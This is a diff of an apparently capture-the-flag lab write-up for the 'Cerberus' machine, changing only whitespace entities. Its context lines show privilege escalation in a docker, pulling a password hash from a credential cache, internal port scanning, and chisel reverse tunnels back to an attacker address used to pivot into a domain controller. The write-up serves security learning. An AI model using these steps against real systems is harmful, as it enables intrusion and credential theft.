@@ -223,7 +223,7 @@ I ran LinPEAS on the machine to enumerate for me. We can find some ports that ar
 
 <figure><img src="../../.gitbook/assets/image (3302).png" alt=""><figcaption></figcaption></figure>
 
-The MySQL database has nothing of interest. Port 80 was hosting nothing as well.&#x20;
+The MySQL database has nothing of interest. Port 80 was hosting nothing as well.
 
 ### Firejail RCE
 
@@ -254,7 +254,7 @@ We have to repeat the RCE exploit that we did previously to make this work. Then
 
 <figure><img src="../../.gitbook/assets/image (792).png" alt=""><figcaption></figcaption></figure>
 
-Great! Now we have access as root on the Linux docker.&#x20;
+Great! Now we have access as root on the Linux docker.
 
 ## Docker Escape
 
@@ -314,7 +314,7 @@ drwxr-xr-x 10 root root    4096 Jan 22 18:12 ..
 -rw-r--r--  1 root root 1286144 Mar  1 12:07 timestamps_cerberus.local.ldb
 ```
 
-When `strings` is used to view the `cache_cerberus.local.ldb` file, we can find a hashed password for `matthew`.&#x20;
+When `strings` is used to view the `cache_cerberus.local.ldb` file, we can find a hashed password for `matthew`.
 
 <figure><img src="../../.gitbook/assets/image (2529).png" alt=""><figcaption></figcaption></figure>
 
@@ -335,7 +335,7 @@ root@icinga:/tmp# cat /etc/hosts
 172.16.22.1 DC.cerberus.local DC cerberus.local
 ```
 
-I did a quick scan and found that the machine had port 5985 for WinRM open, meaning `evil-winrm` can be used to log in as `matthew`.&#x20;
+I did a quick scan and found that the machine had port 5985 for WinRM open, meaning `evil-winrm` can be used to log in as `matthew`.
 
 ```
 root@icinga:/tmp# ./nmap_binary -p 1-10000 172.16.22.1
@@ -358,7 +358,7 @@ MAC Address: 00:15:5D:5F:E8:00 (Unknown)
 Nmap done: 1 IP address (1 host up) scanned in 186.05 seconds
 ```
 
-We can port forward using `chisel`.&#x20;
+We can port forward using `chisel`.
 
 ```bash
 # on my machine
@@ -401,7 +401,7 @@ d-----        9/15/2018  12:19 AM                Windows Portable Devices
 d-----        9/15/2018  12:19 AM                WindowsPowerShell
 ```
 
-This directory contained files for `ADSelfService Plus`. This was an AD service used for SSO and Password Management on the domain.&#x20;
+This directory contained files for `ADSelfService Plus`. This was an AD service used for SSO and Password Management on the domain.
 
 ### ADServicePlus Enumeration
 
@@ -435,7 +435,7 @@ Active Connections
   TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
 ```
 
-Port 9003 is the one we want after some testing. Port 8888 redirects me there for some reason and the rest of the ports weren't interesting. Let's try port forwarding to view the services running on these ports. We would have to port forward again using `chisel` to do this.&#x20;
+Port 9003 is the one we want after some testing. Port 8888 redirects me there for some reason and the rest of the ports weren't interesting. Let's try port forwarding to view the services running on these ports. We would have to port forward again using `chisel` to do this.
 
 ```bash
 # on my machine, with proxychains set up to port 1080
@@ -444,11 +444,11 @@ Port 9003 is the one we want after some testing. Port 8888 redirects me there fo
 ./chisel client 10.10.16.18:9003 R:1080:socks
 ```
 
-Then we need to add `DC.cerberus.local` with the IP of `172.16.22.1` to our `/etc/hosts` file before we can visit this in Firefox with `proxychains`. Very similar to NUS's, interestingly.&#x20;
+Then we need to add `DC.cerberus.local` with the IP of `172.16.22.1` to our `/etc/hosts` file before we can visit this in Firefox with `proxychains`. Very similar to NUS's, interestingly.
 
 <figure><img src="../../.gitbook/assets/image (1587).png" alt=""><figcaption></figcaption></figure>
 
-We can login with `matthew@cerberus.local` and the password we found earlier. This does nothing for us, however. All it does is provide a URL with a token appended at the back:&#x20;
+We can login with `matthew@cerberus.local` and the password we found earlier. This does nothing for us, however. All it does is provide a URL with a token appended at the back:
 
 ```
 https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
